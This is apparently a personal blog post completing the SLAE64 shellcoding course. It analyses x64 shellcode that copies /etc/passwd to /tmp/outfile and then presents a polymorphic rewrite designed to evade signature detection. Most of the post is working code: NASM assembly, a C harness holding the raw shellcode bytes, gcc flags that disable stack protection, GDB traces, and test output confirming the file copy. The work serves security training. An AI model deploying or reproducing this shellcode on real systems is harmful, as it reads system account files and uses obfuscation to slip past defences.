---
title: SLAE64 Assignment 6 - Polymorphic Copy `/etc/passwd` to `/tmp/`
date: 2020-4-26
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

# Overview
For the sixth assignment of the SLAE64, I created three polymorphic payloads from shellcodes on shellstorm and the exploit db. This third payload reads `/etc/passwd` and writes the output to `/tmp/outfile`.


## Original Shellcode
The original shellcode by Chris Higgins can be found here: http://shell-storm.org/shellcode/files/shellcode-867.php

```nasm
; http://shell-storm.org/shellcode/files/shellcode-867.php
;Reads data from /etc/passwd to /tmp/outfile
;No null bytes
;Author: Chris Higgins <chris@chigs.me>
;        @ch1gg1ns -- github.com/chiggins
;        chigstuff.com
;Date:   3-27-2014
;Size:   118 bytes
;Tested: ArchLinux x86_64 3.13.6-1
Assembly:
        xor rax, rax
        mov al, 2
        xor rdi, rdi
        mov rbx, 0x647773
        push rbx
        mov rbx, 0x7361702f6374652f
        push rbx
        lea rdi, [rsp]
        xor rsi, rsi
        syscall
        mov rbx, rax
        xor rax, rax
        mov rdi, rbx
        mov rsi, rsp
        mov dx, 0xFFFF
        syscall
        mov r8, rax
        mov rax, rsp
        xor rbx, rbx
        push rbx
        mov rbx, 0x656c6966
        push rbx
        mov rbx, 0x74756f2f706d742f
        push rbx
        mov rbx, rax
        xor rax, rax
        mov al, 2
        lea rdi, [rsp]
        xor rsi, rsi
        push 0x66
        pop si
        syscall
        mov rdi, rax
        xor rax, rax
        mov al, 1
        lea rsi, [rbx]
        xor rdx, rdx
        mov rdx, r8
        syscall
```

## Testing & Analyzing the Original
First we will analyze the payload with GDB. Hopefully it works as intended!
+ Thankfully the author had already created the host `shellcode.c` program for us.
+ We will use his program and compile it with GCC.

```bash
root# gcc -m64 -z execstack -fno-stack-protector original-shellcode.c -o original-shellcode
root# gdb ./original-shellcode
GNU gdb (Debian 8.3.1-1) 8.3.1
gdb-peda$ b main
Breakpoint 1 at 0x1139
gdb-peda$ r
```

+ Awesome! So far so good!
+ We set a breakpoint on main. We will step through to the shellcode.


## Compile into a known C Host Program
After stepping through his version it seems a little sketch. To play it safe, the shellcode was added to the `shellcode.c` program we are familiar with.

```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb\x73\x77\x64\x00\x53\x48"
"\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73\x53\x48\x8d\x3c\x24\x48"
"\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89"
"\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89\xe0\x48\x31"
"\xdb\x53\xbb\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x2f"
"\x6f\x75\x74\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c"
"\x24\x48\x31\xf6\x6a\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31"
"\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c\x89\xc2\x0f\x05";
int main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```

#### Compile Host C Program
```bash
root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
root# gdb ./shellcode
```

## Analyze Original Shellcode with GDB
### 1st Open System Call
At the start of the shellcode we can see that the `open` system call is used to open the `/etc/passwd` file.

```c
int open(const char *pathname, int flags);
rax=0x2   rdi=&AbsFileName     rsi=0x0
open("/etc/passwd", O_RDONLY)           = 3
```
+ Using `strace` we can see in this process instance of the program, the file-descriptor for the opened `/etc/passwd` file is the value `3`.

```bash
RAX: 0x2
RSI: 0x0
RDI: 0x7fffffffe368 ("/etc/passwd")
   <shellcode>:     xor    rax,rax
   <shellcode+3>:   mov    al,0x2    - open syscall
   <shellcode+5>:   xor    rdi,rdi
   <shellcode+8>:   mov    ebx,0x647773 - "swd"
   <shellcode+13>:  push   rbx
   <shellcode+14>:  movabs rbx,0x7361702f6374652f - "/etc/pas"
   <shellcode+24>:  push   rbx
   <shellcode+25>:  lea    rdi,[rsp] - &etcPasswd
   <shellcode+29>:  xor    rsi,rsi - no flags = 0_RDONLY
=> <shellcode+32>:  syscall
```

+ `RAX=0x2` is the system call setting for the `open` system call.

### Read System Call

```c
ssize_t read(int fd, void *buf, size_t count);
rax=0x0      rdi=fd  rsi=&Dest  rdx=len(2read)
```

```bash
   <shellcode+34>:  mov    rbx,rax - rbx = fd
   <shellcode+37>:  xor    rax,rax
   <shellcode+40>:  mov    rdi,rbx - rdi = fd
   <shellcode+43>:  mov    rsi,rsp - &Dest = Top of Stack
   <shellcode+46>:  mov    dx,0xffff - Read a crap ton of bytes
   <shellcode+50>:  syscall - read systemcall
```

### 2nd Open System Call

```c
int open(const char *pathname, int flags);
rax=0x2   rdi=&AbsFileName     rsi=0x0
```

```bash
RAX: 0x2
RSI: 0x66 ('f')
RDI: 0x7fffffffe350 ("/tmp/outfile")
   <shellcode+52>:  mov    r8,rax
   <shellcode+55>:  mov    rax,rsp
   <shellcode+58>:  xor    rbx,rbx
   <shellcode+61>:  push   rbx     - 0x00 Nulll Str Terminator
   <shellcode+62>:  mov    ebx,0x656c6966 - "file"
   <shellcode+67>:  push   rbx
   <shellcode+68>:  movabs rbx,0x74756f2f706d742f - "/tmp/out"
   <shellcode+78>:  push   rbx
   <shellcode+79>:  mov    rbx,rax
   <shellcode+82>:  xor    rax,rax
   <shellcode+85>:  mov    al,0x2    - open systemcall
   <shellcode+87>:  lea    rdi,[rsp] - rdi = &String
   <shellcode+91>:  xor    rsi,rsi
   <shellcode+94>:  push   0x66
   <shellcode+96>:  pop    si
   <shellcode+98>:  syscall
```

### Write System Call
```c
ssize_t write(int fd, const void *buf, size_t count);
rax= 0x1      rdi=fd  rsi=&Src        rdx=len(write)
```
 
```bash
   <shellcode+100>: mov    rdi,rax  - rdi = fd /tmp/outfile
   <shellcode+103>: xor    rax,rax
   <shellcode+106>: mov    al,0x1   - write systemcall
   <shellcode+108>: lea    rsi,[rbx]
   <shellcode+111>: xor    rdx,rdx
   <shellcode+114>: mov    rdx,r8
   <shellcode+117>: syscall
```


## Polymorphic version
```nasm
; Author: Bobby Cooke
; int open(const char *pathname, int flags);
; rax=0x2   rdi=&AbsFileName     rsi=0x0
; open("/etc/passwd", RDONLY)           = 3
; RAX: 0x2 ; RSI: 0x0 ; RDI: 0x7fffffffe368 ("/etc/passwd")
xor rdi,rdi
mul rdi
push rdi                   ; null terminator
push dword 0x64777373      ; "swd"
mov rdx,0x61702f6374652f2f ; "//etc/pa"
push rdx
mov rdi, rsp               ; ARG1 = &etcPasswd
push rax
pop rsi                    ; ARG2 = RDONLY
mov al, 0x2                ; open syscall
syscall
; ssize-t read(int fd, void ^buf, size-t count);
; rax=0x0      rdi=fd  rsi=&Dest  rdx=len(2read)
mov    rdi, rax            ; rbx = fd
xor    rcx, rcx
mul    rcx                 ; 0x0 = read systemcall
mov    rsi, rsp            ; &Dest = Top of Stack
mov    dx, 0xffff          ; Read a crap ton of bytes
syscall                    ; read systemcall
; int open(const char ^pathname, int flags);
; rax=0x2   rdi=&AbsFileName     rsi=0x0
; RAX: 0x2
; RSI: 0x441 - write
; RDI: 0x7fffffffe350 ("/tmp/outfile")
mov    r8,rax
mov    rax,rsp
xor    rbx,rbx
push   rbx                    ; 0x00 Nulll Str Terminator
mov    ebx,0x656c6966         ; "file"
push   rbx
mov    rbx,0x74756f2f706d742f ; "/tmp/out"
push   rbx
mov    rbx,rax
xor    rax,rax
mov    al,0x2                 ; open systemcall
lea    rdi,[rsp]              ; rdi = &String
xor    rsi,rsi
push   0x441
pop    si
syscall
; ssize-t write(int fd, const void ^buf, size-t count);
; rax= 0x1      rdi=fd  rsi=&Src        rdx=len(write)
mov    rdi,rax           ; rdi = fd /tmp/outfile
xor    rax,rax
mov    al,0x1            ; write systemcall
lea    rsi,[rbx]
xor    rdx,rdx
mov    rdx,r8
syscall
;close(fd)
xor rax, rax             ; rdi is already the file descriptor
add al, 3                ; 0x3 = close systemcall
syscall
;exit(int errcode)
xor rax, rax
mov al, 0x3C             ; 0x3C = exit systemcall
xor rdi, rdi             ; ARG1 = Error Code = 0x0
syscall
```

## Testing our Shellcode Functionality
Here we see that the `/etc/passwd` file exists, and the `/tmp/outfile` does not exist. This is the initial environment before the shellcode is executed.

```bash
root# FILE='/etc/passwd'
root# if [ ! -f $FILE ]; then echo "$FILE does not exist"; else echo "$FILE exists"; fi
/etc/passwd exists
root# FILE='/tmp/outfile'
root# if [ ! -f $FILE ]; then echo "$FILE does not exist"; else echo "$FILE exists"; fi
/tmp/outfile does not exist
```

### Assemble Polymorphic Shellcode and C Host Program
Now we will compile our polymorphic shellcode with our shell script created in the previous blog.
```bash
root# ./assembleAndTest.sh mod-shellcode.asm
[+] Compiling: nasm -f elf64 mod-shellcode.asm -o mod-shellcode.o
[+] Dumping shellcode with objdump
Creating a host file: shellcode.c & adding your shellcode to it
compiling the shellcode with: gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
All done!
-rwxr-xr-x 1 root root 16880 Apr 28 15:08 shellcode
```

### Test Polymorphic Shellcode
```bash
root# if [ ! -f $FILE ]; then echo "$FILE does not exist"; else echo "$FILE exists"; fi
/tmp/outfile does not exist
root# ./shellcode
Shellcode Length:  95
root# if [ ! -f $FILE ]; then echo "$FILE does not exist"; else echo "$FILE exists"; fi
/tmp/outfile exists
root# echo "passwd md5sum:  $(md5sum /etc/passwd)" && echo "outfile md5sum: $(md5sum /tmp/outfile)"
passwd md5sum:  754db0c3ea50e6072bb3585354d31a98  /etc/passwd
outfile md5sum: 754db0c3ea50e6072bb3585354d31a98  /tmp/outfile
```

## SLAE64 Blog Proof
```bash
This blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64):
    https://www.pentesteracademy.com/course?id=7
SLAE/Student ID: PA-10913
```

